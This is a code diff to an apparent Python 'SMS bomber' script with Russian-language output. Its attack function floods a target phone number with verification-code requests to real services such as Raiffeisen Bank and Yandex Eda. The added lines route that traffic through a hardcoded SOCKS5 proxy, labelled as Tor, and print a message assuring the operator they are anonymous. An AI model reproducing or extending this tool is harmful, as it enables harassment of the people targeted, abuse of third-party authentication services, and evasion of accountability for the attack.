@@ -36,6 +36,17 @@ def check(sent, sms):
 	if sent == sms:
 		quit()
 
+print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + '...')
+
+proxies = {
+    'http': 'socks5://139.59.53.105:1080',
+    'https': 'socks5://139.59.53.105:1080'
+}
+
+tor = requests.get('http://icanhazip.com/', proxies=proxies).text
+tor = (tor.replace('\n',''))
+print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + ' - ' +  color.Green + color.BOLD + 'OK ваше очко в безопасности' + color.END)
+
 def attack(number, sms):
 	number_7 = str(7) + number
 	number_plus7 = str(+7) + number
@@ -85,12 +96,6 @@ def attack(number, sms):
 		check(sent, sms)
 		
 		raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':number_7})
-		
-		sent += 1
-		time(sent)
-		check(sent, sms)
-		
-		yandex = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {"phone_number":number_plus7}, headers = {})
 		
 		sent += 1
 		time(sent)
